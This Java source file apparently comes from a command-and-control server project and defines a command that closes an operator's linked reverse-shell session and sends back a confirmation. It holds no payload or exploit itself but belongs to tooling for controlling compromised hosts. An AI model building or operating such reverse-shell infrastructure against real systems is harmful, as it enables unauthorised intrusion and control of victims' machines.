package com.mtattab.c2cServer.service.commands.connected;

import com.mtattab.c2cServer.model.ManagerCommunicationModel;
import com.mtattab.c2cServer.service.Command;
import com.mtattab.c2cServer.util.ConnectionManager;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.util.List;

public class DisconnectCommand implements Command {
    @Override
    public void execute(List<String> args, WebSocketSession currentSocket) {
        WebSocketSession connectedReverseShell= ConnectionManager.connectedManagerToReverseSessions.get(currentSocket);
        SocketUtil.closeSession(connectedReverseShell,currentSocket);
        SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                .msg(String.format("You have disconnected target socket '%s' successfuly",connectedReverseShell.getId() ))
                .build()
        )));

    }
}
